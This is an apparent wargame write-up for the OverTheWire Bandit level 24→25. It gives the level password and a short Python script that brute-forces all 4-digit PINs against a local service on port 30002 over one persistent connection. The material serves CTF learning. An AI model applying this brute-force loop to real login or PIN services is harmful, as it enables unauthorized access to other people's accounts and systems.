## Bandit 24 → 25
bandit24 - UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
These last two are the most exciting. This one involves bruteforcing all 4 digit pins to a remote server. 
The slow way is to loop doing echo foo | nc, but that creates a new connection each time. The faster way 
is to keep the connection open and loop. I used my shoe.py script for easy reading and writing to remote 
servers.

```
#!/usr/bin/python
import shoe

s = shoe.Shoe('localhost', 30002)
for i in range(0, 9999):
    cmd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {}".format(i)
    s.write(cmd + "\n")
    r = s.read_until_end(.001)
    if "Wrong!" not in r and len(r) > 10:
            print(r)
```
